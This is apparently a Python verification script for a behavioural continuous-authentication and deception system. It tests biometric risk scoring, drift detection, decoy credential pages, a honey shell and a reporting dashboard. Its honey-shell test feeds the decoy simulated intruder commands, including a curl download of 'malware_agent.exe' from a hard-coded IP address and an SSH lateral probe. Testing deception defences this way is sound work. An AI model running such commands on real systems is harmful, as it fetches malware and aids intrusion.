import sys
import os
import time

PROJECT_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if PROJECT_ROOT not in sys.path:
    sys.path.insert(0, PROJECT_ROOT)

from PyQt6.QtWidgets import QApplication

def print_banner(title):
    print("\n" + "=" * 70)
    print(f" >>> {title}")
    print("=" * 70)

def main():
    print_banner("CONTINUOUS AUTHENTICATION - FULL SYSTEM VERIFICATION")
    print(f"Workspace: {PROJECT_ROOT}")
    print(f"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}")

    # Ensure QApplication exists for Qt-based components
    app = QApplication.instance()
    if app is None:
        app = QApplication(sys.argv)

    results = []

    # ---------------- 1. ML ENGINE & SENSORS ----------------
    print_banner("1. Testing ML Models & Biometric Evaluator")
    try:
        from telemetry.evaluator import ThreatEvaluator
        evaluator = ThreatEvaluator()
        
        # Test normal record
        normal_record = {
            "dwell_mean": 0.09, "dwell_std": 0.015,
            "flight_mean": 0.12, "flight_std": 0.02,
            "app_dwell_mean": 0.088, "app_flight_mean": 0.115,
            "app_backspace_ratio": 0.12, "app_special_ratio": 0.20,
            "app_click_count": 4, "app_scroll_count": 6, "app_pause_ratio": 0.40,
            "interaction_mode": "ai_chat_or_prompting",
            "mouse_velocity_mean": 250.0, "mouse_acceleration_mean": 12.0,
            "mouse_jerk_mean": 1.1, "mouse_straightness_mean": 0.92,
            "hour_of_day": 14, "cpu_usage": 2.5, "ram_usage_mb": 250.0,
            "active_app": "Antigravity.exe", "keystroke_count": 20
        }
        fused_n, smoothed_n, trig_n = evaluator.evaluate_row(normal_record)
        print(f"   [Normal Behavior] Fused Risk: {fused_n:.4f} | Smoothed Risk: {smoothed_n:.4f} | Triggered: {trig_n}")
        
        # Test anomaly record
        anomaly_record = {
            "dwell_mean": 0.28, "dwell_std": 0.05,
            "flight_mean": 0.38, "flight_std": 0.07,
            "app_dwell_mean": 0.28, "app_flight_mean": 0.38,
            "app_backspace_ratio": 0.02, "app_special_ratio": 0.02,
            "app_click_count": 1, "app_scroll_count": 0, "app_pause_ratio": 0.05,
            "interaction_mode": "command_execution",
            "mouse_velocity_mean": 800.0, "mouse_acceleration_mean": 60.0,
            "mouse_jerk_mean": 10.5, "mouse_straightness_mean": 0.50,
            "hour_of_day": 23, "cpu_usage": 70.0, "ram_usage_mb": 600.0,
            "active_app": "cmd.exe", "keystroke_count": 20
        }
        fused_a, smoothed_a, trig_a = evaluator.evaluate_row(anomaly_record)
        print(f"   [Intruder Anomaly] Fused Risk: {fused_a:.4f} | Smoothed Risk: {smoothed_a:.4f} | Triggered: {trig_a}")
        
        assert fused_n < 0.40
        assert fused_a > 0.75
        print("   [PASS] ML Engine & Biometric Scoring verified successfully.")
        results.append(("ML Models & Biometric Scoring", "PASSED"))
    except Exception as e:
        print(f"   [FAIL] ML Engine error: {e}")
        results.append(("ML Models & Biometric Scoring", f"FAILED: {e}"))

    # ---------------- 2. ADWIN CONCEPT DRIFT DETECTOR (TASK-3) ----------------
    print_banner("2. Testing Formal ADWIN Concept Drift Detection (TASK-3)")
    try:
        from security.drift_detector import MultivariateDriftMonitor
        monitor = MultivariateDriftMonitor(delta=0.01)
        
        # Stream baseline stationary data
        for _ in range(30):
            monitor.process_telemetry_row({"dwell_mean": 0.09, "flight_mean": 0.12, "mouse_velocity_mean": 450.0, "keystroke_count": 10}, risk_score=0.15)
        
        # Inject gradual drift
        drift_detected = False
        for i in range(30):
            verdict = monitor.process_telemetry_row({
                "dwell_mean": 0.09 + (i * 0.008),
                "flight_mean": 0.12 + (i * 0.015),
                "mouse_velocity_mean": 450.0 + (i * 30.0),
                "keystroke_count": 10
            }, risk_score=0.15 + (i * 0.02))
            if verdict["drift_detected"]:
                drift_detected = True
                print(f"   [ADWIN Drift Alert] Concept drift detected at step {i+1} on channels: {verdict['drifting_channels']} (Action: {verdict['recommended_action']})")
                break
                
        assert drift_detected
        print("   [PASS] ADWIN statistical change detector verified successfully.")
        results.append(("ADWIN Concept Drift Detection", "PASSED"))
    except Exception as e:
        print(f"   [FAIL] ADWIN error: {e}")
        results.append(("ADWIN Concept Drift Detection", f"FAILED: {e}"))

    # ---------------- 3. 3-TIER RISK ORCHESTRATION (TASK-4) ----------------
    print_banner("3. Testing 3-Tier Dynamic Risk Orchestrator (TASK-4)")
    try:
        from security.risk_orchestrator import DynamicRiskOrchestrator, RiskTier
        orch = DynamicRiskOrchestrator()
        
        # Tier 1 Low Risk
        t1 = orch.evaluate_policy(instant_risk=0.20, smoothed_risk=0.20)
        assert t1.tier == RiskTier.TIER_1_LOW
        assert not t1.is_blocking
        print(f"   [Tier 1 Verified] Risk 0.20 -> Action: {t1.action} (Silent monitoring)")

        # Tier 2 Medium Risk
        t2 = orch.evaluate_policy(instant_risk=0.60, smoothed_risk=0.60)
        assert t2.tier == RiskTier.TIER_2_MEDIUM
        assert not t2.is_blocking
        print(f"   [Tier 2 Verified] Risk 0.60 -> Action: {t2.action} (Non-blocking Step-Up Toast Challenge)")

        # Tier 3 High Risk
        t3 = orch.evaluate_policy(instant_risk=0.92, smoothed_risk=0.92)
        assert t3.tier == RiskTier.TIER_3_HIGH
        assert t3.is_blocking
        print(f"   [Tier 3 Verified] Risk 0.92 -> Action: {t3.action} (Full Lockdown & Honeypot Diversion)")

        print("   [PASS] 3-Tier Risk Orchestrator verified successfully.")
        results.append(("3-Tier Risk Orchestration", "PASSED"))
    except Exception as e:
        print(f"   [FAIL] Risk Orchestration error: {e}")
        results.append(("3-Tier Risk Orchestration", f"FAILED: {e}"))

    # ---------------- 4. DECOY CHROME & HONEY-TOKENS (TASK-6) ----------------
    print_banner("4. Testing Decoy Web Portals & Honey-Tokens (TASK-6)")
    try:
        from deception.decoy_chrome import DecoyChrome
        from deception.forensic_tracker import get_tracker
        tracker = get_tracker()
        tracker.reset_session()
        chrome = DecoyChrome()

        # NetBanking trap
        chrome.navigate_to_banking()
        chrome.bank_user_input.setText("VICTIM_ADMIN")
        chrome.bank_pass_input.setText("SecretVaultKey2026!")
        chrome.bank_token_input.setText("123456")
        chrome.on_bank_login_submitted()

        # AWS Honey-Token trap
        chrome.navigate_to_aws()
        chrome.on_aws_keys_extracted()
        chrome.on_s3_bucket_clicked("corp-finance-q3-payroll-backups")

        # GitHub Secrets trap
        chrome.navigate_to_github()
        chrome.on_github_secrets_extracted()

        timeline = tracker.get_timeline()
        assert any(e["action_type"] == "CREDENTIAL_TRAP_TRIGGERED" for e in timeline)
        assert any(e["action_type"] == "FILE_CREDENTIAL_EXFILTRATION_ATTEMPT" for e in timeline)
        assert any(e["action_type"] == "FILE_SECRETS_EXFILTRATION_ATTEMPT" for e in timeline)
        print(f"   [Captured Forensics] Successfully trapped banking credentials, AWS root keys, and GitHub secrets ({len(timeline)} events recorded).")
        print("   [PASS] Decoy Chrome & Honey-Tokens verified successfully.")
        results.append(("Decoy Chrome & Honey-Tokens", "PASSED"))
    except Exception as e:
        print(f"   [FAIL] Decoy Chrome error: {e}")
        results.append(("Decoy Chrome & Honey-Tokens", f"FAILED: {e}"))

    # ---------------- 5. HONEYSHELL NETWORK RECON & C2 DIVERSION (TASK-7) ----------------
    print_banner("5. Testing HoneyShell Network Recon & C2 Interception (TASK-7)")
    try:
        from deception.honey_desktop import HoneyShell
        s_dir = os.path.join(PROJECT_ROOT, "data", "test_sandbox_run")
        l_dir = os.path.join(PROJECT_ROOT, "data", "test_forensics_run")
        os.makedirs(s_dir, exist_ok=True)
        os.makedirs(l_dir, exist_ok=True)
        shell = HoneyShell(s_dir, l_dir)

        # 1. Ping
        shell.input_field.setText("ping 192.168.1.1")
        shell.process_command()

        # 2. ARP
        shell.input_field.setText("arp -a")
        shell.process_command()

        # 3. Route
        shell.input_field.setText("route print")
        shell.process_command()

        # 4. Curl C2 download
        shell.input_field.setText("curl http://194.26.29.112/malware_agent.exe -o malware_agent.exe")
        shell.process_command()

        # 5. SSH lateral probe
        shell.input_field.setText("ssh admin@10.0.1.55")
        shell.process_command()

        t_events = tracker.get_timeline()
        assert any(e["action_type"] == "NETWORK_RECONNAISSANCE" for e in t_events)
        assert any(e["action_type"] == "C2_PAYLOAD_INTERCEPTED" for e in t_events)
        assert os.path.exists(os.path.join(s_dir, "malware_agent.exe"))

        import shutil
        shutil.rmtree(s_dir, ignore_errors=True)
        shutil.rmtree(l_dir, ignore_errors=True)

        print("   [Captured Recon & C2] Successfully emulated ping, arp, route, ssh, and quarantined C2 payload download.")
        print("   [PASS] HoneyShell Active Network Reconnaissance verified successfully.")
        results.append(("HoneyShell Network Recon & C2 Diversion", "PASSED"))
    except Exception as e:
        print(f"   [FAIL] HoneyShell error: {e}")
        results.append(("HoneyShell Network Recon & C2 Diversion", f"FAILED: {e}"))

    # ---------------- 6. PASSIVE ENVIRONMENTAL SENSORS (TASK-8) ----------------
    print_banner("6. Testing Passive Environmental Sensors & BLE Proximity (TASK-8)")
    try:
        from telemetry.environmental_sensor import EnvironmentalSensorMonitor, get_environmental_monitor
        env_mon = get_environmental_monitor()

        # 1. Test Log-Distance Path Loss RF calculations
        d_immediate = env_mon.calculate_distance_from_rssi(-59.0)
        d_far = env_mon.calculate_distance_from_rssi(-75.0)
        d_out = env_mon.calculate_distance_from_rssi(-85.0)
        assert d_immediate < 1.5, f"Expected < 1.5m, got {d_immediate}"
        assert d_far > 4.0, f"Expected > 4.0m, got {d_far}"
        assert env_mon.classify_proximity_zone(d_immediate) == "IMMEDIATE"
        assert env_mon.classify_proximity_zone(d_out) == "OUT_OF_RANGE"
        print(f"   [BLE Path Loss Formula] RSSI -59 dBm -> {d_immediate:.2f}m (IMMEDIATE) | -85 dBm -> {d_out:.2f}m (OUT_OF_RANGE)")

        # 2. Test Network Context & Untrusted SSID detection
        untrusted_verdict = env_mon.is_untrusted_network(ssid="Starbucks_Free_WiFi", is_open=True)
        trusted_verdict = env_mon.is_untrusted_network(ssid="Campus_Lab_NMAMIT", is_open=False)
        assert untrusted_verdict is True
        assert trusted_verdict is False
        print(f"   [Network Context] 'Starbucks_Free_WiFi' flagged as untrusted: {untrusted_verdict} | 'Campus_Lab_NMAMIT' vetted: {not trusted_verdict}")

        # 3. Test Threat Evaluator walk-away penalty
        from telemetry.evaluator import ThreatEvaluator
        evaluator_base = ThreatEvaluator()
        evaluator_away = ThreatEvaluator()
        baseline_row = {
            "dwell_mean": 0.09, "flight_mean": 0.12, "mouse_velocity_mean": 250.0,
            "active_app": "cmd.exe", "keystroke_count": 15,
            "owner_phone_present": True,
            "ble_proximity_state": "IMMEDIATE",
            "is_untrusted_network": False
        }
        walkaway_row = dict(baseline_row)
        walkaway_row.update({
            "owner_phone_present": False,
            "ble_proximity_state": "OUT_OF_RANGE"
        })
        fused_baseline, _, _ = evaluator_base.evaluate_row(baseline_row)
        fused_walkaway, _, _ = evaluator_away.evaluate_row(walkaway_row)
        diff = fused_walkaway - fused_baseline
        assert diff >= 0.20, f"Expected walk-away penalty of at least 0.20, got {diff:.4f}"
        print(f"   [Physical Walk-Away Penalty] Baseline Risk: {fused_baseline:.4f} -> Walk-Away Risk: {fused_walkaway:.4f} (+{diff:.4f} penalty applied)")

        print("   [PASS] Environmental Sensors (BLE & Network Context) verified successfully.")
        results.append(("Environmental Sensors & BLE Proximity", "PASSED"))
    except Exception as e:
        print(f"   [FAIL] Environmental Sensor error: {e}")
        results.append(("Environmental Sensors & BLE Proximity", f"FAILED: {e}"))

    # ---------------- 7. OFFLINE OLLAMA AI INTENT ANALYZER ----------------
    print_banner("7. Testing Offline Ollama AI Threat Intelligence")
    try:
        from deception.ai_intent_analyzer import IntruderIntentAnalyzer
        analyzer = IntruderIntentAnalyzer()
        timeline = tracker.get_timeline()
        stats = tracker.get_summary_stats()
        intent = analyzer.analyze_session(timeline, stats)
        print(f"   [AI Threat Engine Result]")
        print(f"   * Attacker Persona : {intent.get('attacker_persona')}")
        print(f"   * Threat Level     : {intent.get('threat_level')}")
        print(f"   * Primary Intent   : {intent.get('primary_intent')}")
        print(f"   * MITRE Tactics    : {', '.join(intent.get('mitre_tactics', []))}")
        assert intent.get("threat_level") in ["LOW", "MEDIUM", "HIGH", "CRITICAL"]
        print("   [PASS] Offline AI Threat Intent Analyzer verified successfully.")
        results.append(("Offline AI Threat Intelligence", "PASSED"))
    except Exception as e:
        print(f"   [FAIL] AI Intent Analyzer error: {e}")
        results.append(("Offline AI Threat Intelligence", f"FAILED: {e}"))

    # ---------------- 8. FORENSIC PDF REPORT GENERATOR ----------------
    print_banner("8. Testing Executive Forensic PDF Report Generator")
    try:
        from dashboard.pdf_generator import ForensicReportGenerator
        pdf_gen = ForensicReportGenerator()
        pdf_file = pdf_gen.generate_report()
        assert os.path.exists(pdf_file)
        sz = os.path.getsize(pdf_file)
        print(f"   [Forensic PDF Generated] Size: {sz:,} bytes at '{pdf_file}'")
        assert sz > 5000
        print("   [PASS] Multi-page Forensic PDF Report verified successfully.")
        results.append(("Forensic PDF Report Generator", "PASSED"))
    except Exception as e:
        print(f"   [FAIL] PDF Report error: {e}")
        results.append(("Forensic PDF Report Generator", f"FAILED: {e}"))

    # ---------------- 9. FASTAPI & WEBSOCKET CYBER DASHBOARD (TASK-1 & 2) ----------------
    print_banner("9. Testing Cyber-Ops Web Dashboard & REST APIs (TASK-1 & 2)")
    try:
        from fastapi.testclient import TestClient
        from dashboard.app import app as fastapi_app
        client = TestClient(fastapi_app)

        r_html = client.get("/")
        assert r_html.status_code == 200
        assert "BEHAVIORAL DRIFT SOC" in r_html.text

        r_status = client.get("/api/status")
        assert r_status.status_code == 200
        assert r_status.json()["status"] == "ONLINE"

        r_pdf = client.get("/api/forensics/download_pdf")
        assert r_pdf.status_code == 200
        assert r_pdf.headers["content-type"] == "application/pdf"

        print("   [REST Endpoints Verified] Home Console OK | Status API OK | PDF Download OK")
        print("   [PASS] FastAPI Web Dashboard & Endpoints verified successfully.")
        results.append(("FastAPI Web Dashboard & REST APIs", "PASSED"))
    except Exception as e:
        import traceback
        traceback.print_exc()
        print(f"   [FAIL] Web Dashboard error: {e}")
        results.append(("FastAPI Web Dashboard & REST APIs", f"FAILED: {e}"))

    # ---------------- 10. REAL-WORLD DATASET HARVESTER & BENCHMARK (TASK-9) ----------------
    print_banner("10. Testing Multi-User Dataset Harvester & Field Benchmark (TASK-9)")
    try:
        from scripts.harvest_real_telemetry import RealTelemetryHarvester, DatasetPartitioner, FieldBenchmarkEvaluator
        import shutil

        test_hdir = os.path.join(PROJECT_ROOT, "data", "test_verify_harvest")
        test_sdir = os.path.join(test_hdir, "sessions")
        os.makedirs(test_sdir, exist_ok=True)

        harvester = RealTelemetryHarvester(output_dir=test_sdir)
        # Generate test owner & imposter sessions
        harvester.generate_simulated_session("Owner_Verify", True, "coding", num_samples=15, seed=77)
        harvester.generate_simulated_session("Imposter_Verify", False, "imposter_mimic", num_samples=15, seed=88)

        # Partition dataset
        partitioner = DatasetPartitioner(harvest_dir=test_hdir)
        manifest = partitioner.partition_dataset(train_ratio=0.80)
        assert manifest["train_samples"] > 0
        assert manifest["test_samples"] > 0

        # Evaluate benchmark
        evaluator = FieldBenchmarkEvaluator(harvest_dir=test_hdir)
        bench_res = evaluator.run_benchmark()
        assert "fused" in bench_res
        assert bench_res["fused"]["roc_auc"] > 0.80
        assert os.path.exists(bench_res["chart_path"])

        shutil.rmtree(test_hdir, ignore_errors=True)
        print(f"   [Field Benchmark Verified] Fused ROC-AUC: {bench_res['fused']['roc_auc']:.4f} | EER: {bench_res['fused']['eer']:.2f}% | Chart exported.")
        print("   [PASS] Multi-User Dataset Harvester & Field Benchmark verified successfully.")
        results.append(("Multi-User Dataset Harvester (TASK-9)", "PASSED"))
    except Exception as e:
        print(f"   [FAIL] Harvester benchmark error: {e}")
        results.append(("Multi-User Dataset Harvester (TASK-9)", f"FAILED: {e}"))

    # ---------------- 11. CMU ACADEMIC BENCHMARK EVALUATION (TASK-10) ----------------
    print_banner("11. Testing CMU Keystroke Academic Benchmark (TASK-10)")
    try:
        from scripts.benchmark_cmu_dataset import CMUBenchmarkEngine, ensure_cmu_dataset, PUBLISHED_IEEE_BASELINES
        engine = CMUBenchmarkEngine()
        # Verify dataset integrity (51 subjects, 31 timing features)
        assert len(engine.subjects) >= 50
        assert len(engine.features) == 31

        # Evaluate first subject to verify Killourhy & Maxion protocol
        sub_res = engine.evaluate_subject(engine.subjects[0])
        assert "Proposed Hybrid Continuous Fusion" in sub_res
        assert "Scaled Manhattan" in sub_res
        assert sub_res["Proposed Hybrid Continuous Fusion"]["eer"] < 0.35
        print(f"   [CMU Benchmark Protocol Verified] Subject '{engine.subjects[0]}': Fused EER = {sub_res['Proposed Hybrid Continuous Fusion']['eer']*100:.2f}% | AUC = {sub_res['Proposed Hybrid Continuous Fusion']['auc']:.4f}")
        print("   [PASS] CMU Keystroke Academic Benchmark verified successfully.")
        results.append(("CMU Academic Benchmark (TASK-10)", "PASSED"))
    except Exception as e:
        print(f"   [FAIL] CMU Benchmark error: {e}")
        results.append(("CMU Academic Benchmark (TASK-10)", f"FAILED: {e}"))

    # ---------------- 12. UNIFIED PROCESS SUPERVISOR (TASK-11) ----------------
    print_banner("12. Testing Unified One-Click Launcher & Supervisor (TASK-11)")
    try:
        from run_system import SystemSupervisor, create_shield_icon, PYQT_AVAILABLE
        # 1. Test tray shield icon generation
        if PYQT_AVAILABLE:
            icon = create_shield_icon("#27ae60")
            assert icon is not None
            print("   [Tray Icon Verified] Vector security shield icon generated.")

        # 2. Test supervisor registration and status summary
        supervisor = SystemSupervisor(port=8097, enable_browser=False, enable_tray=False)
        assert len(supervisor.workers) == 3
        assert "telemetry_agent" in supervisor.workers
        assert "threat_evaluator" in supervisor.workers
        assert "web_dashboard" in supervisor.workers

        status = supervisor.get_status_summary()
        assert status["port"] == 8097
        assert len(status["workers"]) == 3
        print(f"   [Process Supervisor Verified] 3 workers configured (telemetry_agent, threat_evaluator, web_dashboard).")
        print("   [PASS] Unified One-Click Launcher & Process Supervisor verified successfully.")
        results.append(("Unified Process Supervisor (TASK-11)", "PASSED"))
    except Exception as e:
        print(f"   [FAIL] Process Supervisor error: {e}")
        results.append(("Unified Process Supervisor (TASK-11)", f"FAILED: {e}"))

    # ---------------- FINAL SUMMARY ----------------
    print_banner("SYSTEM VERIFICATION SUMMARY")
    all_passed = True
    for name, status in results:
        status_marker = "[PASS]" if status == "PASSED" else "[FAIL]"
        print(f"   {status_marker:<8} {name:<42} : {status}")
        if status != "PASSED":
            all_passed = False

    print("=" * 70)
    if all_passed:
        print(" ALL 12 CRITICAL SUBSYSTEMS ARE 100% OPERATIONAL AND VERIFIED!")
    else:
        print(" SOME COMPONENTS FAILED VERIFICATION.")
    print("=" * 70)

if __name__ == "__main__":
    main()
